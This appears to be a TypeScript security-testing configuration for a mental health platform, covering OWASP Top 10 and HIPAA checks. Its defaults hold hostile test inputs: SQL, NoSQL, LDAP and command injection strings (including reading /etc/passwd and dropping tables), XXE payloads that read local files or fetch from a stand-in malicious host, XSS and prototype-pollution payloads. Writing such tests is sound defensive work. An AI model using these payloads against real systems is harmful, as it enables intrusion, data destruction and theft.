/**
 * Security Test Configuration for AstralCore Mental Health Platform
 * HIPAA Compliant Security Testing Framework
 * 
 * This configuration defines comprehensive security testing parameters
 * aligned with OWASP Top 10 and HIPAA compliance requirements.
 */

export interface SecurityTestConfig {
  // OWASP Top 10 Test Configurations
  owasp: {
    injectionTests: InjectionTestConfig;
    brokenAuthentication: AuthTestConfig;
    sensitiveDataExposure: DataExposureTestConfig;
    xmlExternalEntities: XXETestConfig;
    brokenAccessControl: AccessControlTestConfig;
    securityMisconfiguration: MisconfigTestConfig;
    xss: XSSTestConfig;
    insecureDeserialization: DeserializationTestConfig;
    componentsWithVulnerabilities: ComponentTestConfig;
    insufficientLogging: LoggingTestConfig;
  };

  // HIPAA Compliance Specific Tests
  hipaa: {
    phiProtection: PHITestConfig;
    accessControls: HIPAAAccessTestConfig;
    auditControls: AuditTestConfig;
    integrity: IntegrityTestConfig;
    transmission: TransmissionTestConfig;
    encryption: EncryptionTestConfig;
    businessAssociate: BATestConfig;
  };

  // Mental Health Platform Specific Tests
  mentalHealth: {
    crisisIntervention: CrisisTestConfig;
    therapistSafety: TherapistSafetyTestConfig;
    minorProtection: MinorProtectionTestConfig;
    emergencyAccess: EmergencyAccessTestConfig;
  };

  // Test Environment Configuration
  environment: {
    testDatabaseUrl: string;
    testRedisUrl: string;
    mockApiEndpoints: boolean;
    isolatedTestEnvironment: boolean;
    maxTestDuration: number; // milliseconds
  };

  // Rate Limiting and Security Headers
  security: {
    rateLimiting: RateLimitTestConfig;
    headers: SecurityHeadersTestConfig;
    cors: CORSTestConfig;
    csp: CSPTestConfig;
  };
}

// OWASP Top 10 Configurations
export interface InjectionTestConfig {
  sqlInjection: {
    enabled: boolean;
    testPayloads: string[];
    endpoints: string[];
    expectedBehavior: 'block' | 'sanitize';
  };
  nosqlInjection: {
    enabled: boolean;
    testPayloads: object[];
    mongoEndpoints: string[];
  };
  commandInjection: {
    enabled: boolean;
    testCommands: string[];
    fileUploadEndpoints: string[];
  };
  ldapInjection: {
    enabled: boolean;
    testPayloads: string[];
    authEndpoints: string[];
  };
}

export interface AuthTestConfig {
  sessionManagement: {
    sessionTimeout: number;
    sessionFixation: boolean;
    concurrentSessions: number;
    sessionInvalidation: boolean;
  };
  passwordPolicy: {
    minLength: number;
    complexity: boolean;
    history: number;
    expiration: number;
  };
  mfa: {
    required: boolean;
    methods: string[];
    backupCodes: boolean;
    deviceTrust: boolean;
  };
  bruteForce: {
    maxAttempts: number;
    lockoutDuration: number;
    progressiveDelay: boolean;
  };
}

export interface DataExposureTestConfig {
  phiExposure: {
    logFiles: boolean;
    errorMessages: boolean;
    debugInfo: boolean;
    backupFiles: boolean;
  };
  encryptionAtRest: {
    database: boolean;
    fileSystem: boolean;
    backups: boolean;
    logs: boolean;
  };
  encryptionInTransit: {
    apiCalls: boolean;
    websockets: boolean;
    fileTransfers: boolean;
    emailCommunications: boolean;
  };
}

export interface XXETestConfig {
  xmlParsing: {
    enabled: boolean;
    externalEntities: boolean;
    dtdProcessing: boolean;
    testPayloads: string[];
  };
  documentUploads: {
    xmlFiles: boolean;
    officeDocuments: boolean;
    svgFiles: boolean;
  };
}

export interface AccessControlTestConfig {
  rbac: {
    roleEscalation: boolean;
    horizontalPrivilegeEscalation: boolean;
    verticalPrivilegeEscalation: boolean;
    resourceAccess: boolean;
  };
  directObjectReference: {
    userDataAccess: boolean;
    documentAccess: boolean;
    apiResourceAccess: boolean;
  };
  urlAccess: {
    adminPaths: string[];
    therapistPaths: string[];
    patientPaths: string[];
  };
}

export interface MisconfigTestConfig {
  serverConfiguration: {
    defaultCredentials: boolean;
    unnecessaryServices: boolean;
    directoryListings: boolean;
    errorHandling: boolean;
  };
  securityHeaders: {
    hsts: boolean;
    csp: boolean;
    xFrameOptions: boolean;
    xContentTypeOptions: boolean;
    referrerPolicy: boolean;
  };
}

export interface XSSTestConfig {
  reflectedXSS: {
    enabled: boolean;
    testPayloads: string[];
    inputFields: string[];
  };
  storedXSS: {
    enabled: boolean;
    testPayloads: string[];
    storageFields: string[];
  };
  domXSS: {
    enabled: boolean;
    jsPayloads: string[];
    clientSideInputs: string[];
  };
}

export interface DeserializationTestConfig {
  jsonDeserialization: {
    enabled: boolean;
    maliciousPayloads: object[];
    endpoints: string[];
  };
  objectDeserialization: {
    enabled: boolean;
    serializedPayloads: string[];
  };
}

export interface ComponentTestConfig {
  dependencyScanning: {
    enabled: boolean;
    npmAudit: boolean;
    retireJS: boolean;
    customVulnDB: boolean;
  };
  containerScanning: {
    enabled: boolean;
    baseImageVulns: boolean;
    configurationIssues: boolean;
  };
}

export interface LoggingTestConfig {
  securityEvents: {
    loginAttempts: boolean;
    accessControlFailures: boolean;
    inputValidationFailures: boolean;
    authenticationEvents: boolean;
  };
  auditTrail: {
    phiAccess: boolean;
    administrativeActions: boolean;
    systemChanges: boolean;
    dataModifications: boolean;
  };
}

// HIPAA Compliance Configurations
export interface PHITestConfig {
  dataClassification: {
    automaticDetection: boolean;
    manualTagging: boolean;
    dataFlowTracking: boolean;
  };
  dataMinimization: {
    collectionLimits: boolean;
    retentionPolicies: boolean;
    purposeSpecification: boolean;
  };
  deidentification: {
    safeHarborMethod: boolean;
    expertDetermination: boolean;
    reidentificationRisk: boolean;
  };
}

export interface HIPAAAccessTestConfig {
  minimumNecessary: {
    roleBasedAccess: boolean;
    needToKnowBasis: boolean;
    accessLogging: boolean;
  };
  userAccessManagement: {
    accessProvisioning: boolean;
    accessReview: boolean;
    accessTermination: boolean;
  };
  emergencyAccess: {
    breakGlassAccess: boolean;
    emergencyOverrides: boolean;
    temporaryAccess: boolean;
  };
}

export interface AuditTestConfig {
  auditLogs: {
    completeness: boolean;
    integrity: boolean;
    availability: boolean;
    retention: number; // days
  };
  monitoredEvents: {
    phiAccess: boolean;
    systemAccess: boolean;
    securityIncidents: boolean;
    configurationChanges: boolean;
  };
  auditReview: {
    regularReview: boolean;
    automatedAnalysis: boolean;
    alerting: boolean;
  };
}

export interface IntegrityTestConfig {
  dataIntegrity: {
    checksums: boolean;
    digitalSignatures: boolean;
    versionControl: boolean;
  };
  systemIntegrity: {
    fileIntegrityMonitoring: boolean;
    configurationBaselines: boolean;
    malwareProtection: boolean;
  };
}

export interface TransmissionTestConfig {
  encryption: {
    tlsVersion: string;
    cipherSuites: string[];
    certificateValidation: boolean;
  };
  messageIntegrity: {
    digitalSignatures: boolean;
    messageAuthentication: boolean;
    timestamping: boolean;
  };
}

export interface EncryptionTestConfig {
  algorithms: {
    symmetric: string[];
    asymmetric: string[];
    hashing: string[];
  };
  keyManagement: {
    keyGeneration: boolean;
    keyStorage: boolean;
    keyRotation: boolean;
    keyDestruction: boolean;
  };
  implementation: {
    properImplementation: boolean;
    randomnessQuality: boolean;
    sidechannelResistance: boolean;
  };
}

export interface BATestConfig {
  agreements: {
    signedBAA: boolean;
    complianceMonitoring: boolean;
    subcontractorManagement: boolean;
  };
  dataHandling: {
    permittedUses: boolean;
    dataReturn: boolean;
    dataDestruction: boolean;
  };
}

// Mental Health Specific Configurations
export interface CrisisTestConfig {
  interventionAccess: {
    immediateAccess: boolean;
    escalationPaths: boolean;
    emergencyContacts: boolean;
  };
  riskAssessment: {
    suicidalRisk: boolean;
    homicidalRisk: boolean;
    selfHarmRisk: boolean;
  };
  emergencyProtocols: {
    lawEnforcement: boolean;
    medicalEmergency: boolean;
    mentalHealthHold: boolean;
  };
}

export interface TherapistSafetyTestConfig {
  threatAssessment: {
    clientThreatLevel: boolean;
    safeworkingConditions: boolean;
    emergencyProcedures: boolean;
  };
  professionalBoundaries: {
    dualRelationships: boolean;
    appropriateContact: boolean;
    supervisoryOversight: boolean;
  };
}

export interface MinorProtectionTestConfig {
  parentalConsent: {
    consentVerification: boolean;
    ageVerification: boolean;
    guardianshipValidation: boolean;
  };
  mandatoryReporting: {
    abuseDetection: boolean;
    reportingRequirements: boolean;
    documentationStandards: boolean;
  };
  specialProtections: {
    limitedDataCollection: boolean;
    parentalAccess: boolean;
    treatmentConsent: boolean;
  };
}

export interface EmergencyAccessTestConfig {
  breakGlass: {
    emergencyOverride: boolean;
    justificationRequired: boolean;
    auditingEnhanced: boolean;
  };
  crisisAccess: {
    immediateAccess: boolean;
    temporaryElevation: boolean;
    timebasedAccess: boolean;
  };
}

// Security Infrastructure Configurations
export interface RateLimitTestConfig {
  apiEndpoints: {
    enabled: boolean;
    requestsPerMinute: number;
    burstAllowance: number;
    blockDuration: number;
  };
  loginAttempts: {
    maxAttempts: number;
    timeWindow: number;
    progressiveDelay: boolean;
  };
  resourceAccess: {
    phiQueries: number;
    fileDownloads: number;
    reportGeneration: number;
  };
}

export interface SecurityHeadersTestConfig {
  requiredHeaders: {
    strictTransportSecurity: boolean;
    contentSecurityPolicy: boolean;
    xFrameOptions: boolean;
    xContentTypeOptions: boolean;
    referrerPolicy: boolean;
    permissionsPolicy: boolean;
  };
  hipaaHeaders: {
    cacheControl: boolean;
    pragma: boolean;
    expires: boolean;
  };
}

export interface CORSTestConfig {
  allowedOrigins: string[];
  allowedMethods: string[];
  allowedHeaders: string[];
  credentials: boolean;
  preflightMaxAge: number;
}

export interface CSPTestConfig {
  directives: {
    defaultSrc: string[];
    scriptSrc: string[];
    styleSrc: string[];
    imgSrc: string[];
    connectSrc: string[];
    fontSrc: string[];
    objectSrc: string[];
    mediaSrc: string[];
    frameSrc: string[];
  };
  reportOnly: boolean;
  reportUri: string;
}

// Default Security Test Configuration
export const defaultSecurityConfig: SecurityTestConfig = {
  owasp: {
    injectionTests: {
      sqlInjection: {
        enabled: true,
        testPayloads: [
          "' OR '1'='1",
          "'; DROP TABLE users; --",
          "' UNION SELECT * FROM sensitive_data --",
          "1' OR SLEEP(5) --"
        ],
        endpoints: ['/api/auth/login', '/api/user/profile', '/api/journal/entries'],
        expectedBehavior: 'block'
      },
      nosqlInjection: {
        enabled: true,
        testPayloads: [
          { $where: "function() { return true; }" },
          { $regex: ".*", $options: "i" },
          { $ne: null }
        ],
        mongoEndpoints: ['/api/user/search', '/api/journal/query']
      },
      commandInjection: {
        enabled: true,
        testCommands: [
          "; ls -la",
          "| cat /etc/passwd",
          "& whoami",
          "`id`"
        ],
        fileUploadEndpoints: ['/api/files/upload', '/api/documents/upload']
      },
      ldapInjection: {
        enabled: true,
        testPayloads: [
          "admin)(&(|",
          "*)(uid=*))(|(uid=*",
          "admin)(!(&(1=0"
        ],
        authEndpoints: ['/api/auth/ldap']
      }
    },
    brokenAuthentication: {
      sessionManagement: {
        sessionTimeout: 1800000, // 30 minutes
        sessionFixation: false,
        concurrentSessions: 3,
        sessionInvalidation: true
      },
      passwordPolicy: {
        minLength: 12,
        complexity: true,
        history: 12,
        expiration: 90
      },
      mfa: {
        required: true,
        methods: ['totp', 'sms', 'push'],
        backupCodes: true,
        deviceTrust: true
      },
      bruteForce: {
        maxAttempts: 5,
        lockoutDuration: 900000, // 15 minutes
        progressiveDelay: true
      }
    },
    sensitiveDataExposure: {
      phiExposure: {
        logFiles: false,
        errorMessages: false,
        debugInfo: false,
        backupFiles: false
      },
      encryptionAtRest: {
        database: true,
        fileSystem: true,
        backups: true,
        logs: true
      },
      encryptionInTransit: {
        apiCalls: true,
        websockets: true,
        fileTransfers: true,
        emailCommunications: true
      }
    },
    xmlExternalEntities: {
      xmlParsing: {
        enabled: true,
        externalEntities: false,
        dtdProcessing: false,
        testPayloads: [
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://malicious.com/evil.dtd">]><foo>&xxe;</foo>'
        ]
      },
      documentUploads: {
        xmlFiles: true,
        officeDocuments: true,
        svgFiles: true
      }
    },
    brokenAccessControl: {
      rbac: {
        roleEscalation: false,
        horizontalPrivilegeEscalation: false,
        verticalPrivilegeEscalation: false,
        resourceAccess: true
      },
      directObjectReference: {
        userDataAccess: true,
        documentAccess: true,
        apiResourceAccess: true
      },
      urlAccess: {
        adminPaths: ['/admin', '/dashboard/admin', '/api/admin'],
        therapistPaths: ['/therapist', '/dashboard/therapist'],
        patientPaths: ['/patient', '/dashboard/patient']
      }
    },
    securityMisconfiguration: {
      serverConfiguration: {
        defaultCredentials: false,
        unnecessaryServices: false,
        directoryListings: false,
        errorHandling: true
      },
      securityHeaders: {
        hsts: true,
        csp: true,
        xFrameOptions: true,
        xContentTypeOptions: true,
        referrerPolicy: true
      }
    },
    xss: {
      reflectedXSS: {
        enabled: true,
        testPayloads: [
          '<script>alert("XSS")</script>',
          '<img src="x" onerror="alert(1)">',
          'javascript:alert(document.cookie)',
          '<svg/onload=alert(1)>'
        ],
        inputFields: ['search', 'comment', 'name', 'message']
      },
      storedXSS: {
        enabled: true,
        testPayloads: [
          '<script>alert("Stored XSS")</script>',
          '<iframe src="javascript:alert(1)">',
          '<object data="javascript:alert(1)">'
        ],
        storageFields: ['journal_entry', 'user_bio', 'appointment_notes']
      },
      domXSS: {
        enabled: true,
        jsPayloads: [
          'document.location.hash',
          'window.name',
          'document.referrer'
        ],
        clientSideInputs: ['hash', 'search_params', 'post_message']
      }
    },
    insecureDeserialization: {
      jsonDeserialization: {
        enabled: true,
        maliciousPayloads: [
          { "__proto__": { "isAdmin": true } },
          { "constructor": { "prototype": { "isAdmin": true } } }
        ],
        endpoints: ['/api/user/profile', '/api/settings/update']
      },
      objectDeserialization: {
        enabled: true,
        serializedPayloads: [
          'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwPQAAAAx3CAAAABAAAAAAeA=='
        ]
      }
    },
    componentsWithVulnerabilities: {
      dependencyScanning: {
        enabled: true,
        npmAudit: true,
        retireJS: true,
        customVulnDB: true
      },
      containerScanning: {
        enabled: true,
        baseImageVulns: true,
        configurationIssues: true
      }
    },
    insufficientLogging: {
      securityEvents: {
        loginAttempts: true,
        accessControlFailures: true,
        inputValidationFailures: true,
        authenticationEvents: true
      },
      auditTrail: {
        phiAccess: true,
        administrativeActions: true,
        systemChanges: true,
        dataModifications: true
      }
    }
  },
  hipaa: {
    phiProtection: {
      dataClassification: {
        automaticDetection: true,
        manualTagging: true,
        dataFlowTracking: true
      },
      dataMinimization: {
        collectionLimits: true,
        retentionPolicies: true,
        purposeSpecification: true
      },
      deidentification: {
        safeHarborMethod: true,
        expertDetermination: true,
        reidentificationRisk: true
      }
    },
    accessControls: {
      minimumNecessary: {
        roleBasedAccess: true,
        needToKnowBasis: true,
        accessLogging: true
      },
      userAccessManagement: {
        accessProvisioning: true,
        accessReview: true,
        accessTermination: true
      },
      emergencyAccess: {
        breakGlassAccess: true,
        emergencyOverrides: true,
        temporaryAccess: true
      }
    },
    auditControls: {
      auditLogs: {
        completeness: true,
        integrity: true,
        availability: true,
        retention: 2555 // 7 years in days
      },
      monitoredEvents: {
        phiAccess: true,
        systemAccess: true,
        securityIncidents: true,
        configurationChanges: true
      },
      auditReview: {
        regularReview: true,
        automatedAnalysis: true,
        alerting: true
      }
    },
    integrity: {
      dataIntegrity: {
        checksums: true,
        digitalSignatures: true,
        versionControl: true
      },
      systemIntegrity: {
        fileIntegrityMonitoring: true,
        configurationBaselines: true,
        malwareProtection: true
      }
    },
    transmission: {
      encryption: {
        tlsVersion: '1.3',
        cipherSuites: [
          'TLS_AES_256_GCM_SHA384',
          'TLS_CHACHA20_POLY1305_SHA256',
          'TLS_AES_128_GCM_SHA256'
        ],
        certificateValidation: true
      },
      messageIntegrity: {
        digitalSignatures: true,
        messageAuthentication: true,
        timestamping: true
      }
    },
    encryption: {
      algorithms: {
        symmetric: ['AES-256-GCM', 'AES-256-CBC'],
        asymmetric: ['RSA-4096', 'ECDSA-P384'],
        hashing: ['SHA-256', 'SHA-384', 'PBKDF2']
      },
      keyManagement: {
        keyGeneration: true,
        keyStorage: true,
        keyRotation: true,
        keyDestruction: true
      },
      implementation: {
        properImplementation: true,
        randomnessQuality: true,
        sidechannelResistance: true
      }
    },
    businessAssociate: {
      agreements: {
        signedBAA: true,
        complianceMonitoring: true,
        subcontractorManagement: true
      },
      dataHandling: {
        permittedUses: true,
        dataReturn: true,
        dataDestruction: true
      }
    }
  },
  mentalHealth: {
    crisisIntervention: {
      interventionAccess: {
        immediateAccess: true,
        escalationPaths: true,
        emergencyContacts: true
      },
      riskAssessment: {
        suicidalRisk: true,
        homicidalRisk: true,
        selfHarmRisk: true
      },
      emergencyProtocols: {
        lawEnforcement: true,
        medicalEmergency: true,
        mentalHealthHold: true
      }
    },
    therapistSafety: {
      threatAssessment: {
        clientThreatLevel: true,
        safeworkingConditions: true,
        emergencyProcedures: true
      },
      professionalBoundaries: {
        dualRelationships: true,
        appropriateContact: true,
        supervisoryOversight: true
      }
    },
    minorProtection: {
      parentalConsent: {
        consentVerification: true,
        ageVerification: true,
        guardianshipValidation: true
      },
      mandatoryReporting: {
        abuseDetection: true,
        reportingRequirements: true,
        documentationStandards: true
      },
      specialProtections: {
        limitedDataCollection: true,
        parentalAccess: true,
        treatmentConsent: true
      }
    },
    emergencyAccess: {
      breakGlass: {
        emergencyOverride: true,
        justificationRequired: true,
        auditingEnhanced: true
      },
      crisisAccess: {
        immediateAccess: true,
        temporaryElevation: true,
        timebasedAccess: true
      }
    }
  },
  environment: {
    testDatabaseUrl: 'postgresql://test:test@localhost:5432/astralcore_test',
    testRedisUrl: 'redis://localhost:6379/1',
    mockApiEndpoints: true,
    isolatedTestEnvironment: true,
    maxTestDuration: 300000 // 5 minutes
  },
  security: {
    rateLimiting: {
      apiEndpoints: {
        enabled: true,
        requestsPerMinute: 100,
        burstAllowance: 20,
        blockDuration: 300000 // 5 minutes
      },
      loginAttempts: {
        maxAttempts: 5,
        timeWindow: 900000, // 15 minutes
        progressiveDelay: true
      },
      resourceAccess: {
        phiQueries: 50,
        fileDownloads: 10,
        reportGeneration: 3
      }
    },
    headers: {
      requiredHeaders: {
        strictTransportSecurity: true,
        contentSecurityPolicy: true,
        xFrameOptions: true,
        xContentTypeOptions: true,
        referrerPolicy: true,
        permissionsPolicy: true
      },
      hipaaHeaders: {
        cacheControl: true,
        pragma: true,
        expires: true
      }
    },
    cors: {
      allowedOrigins: ['https://astralcore.app', 'https://admin.astralcore.app'],
      allowedMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
      allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
      credentials: true,
      preflightMaxAge: 86400
    },
    csp: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "https://trusted-cdn.com"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'", "wss:", "https:"],
        fontSrc: ["'self'", "https://fonts.gstatic.com"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"]
      },
      reportOnly: false,
      reportUri: '/api/security/csp-report'
    }
  }
};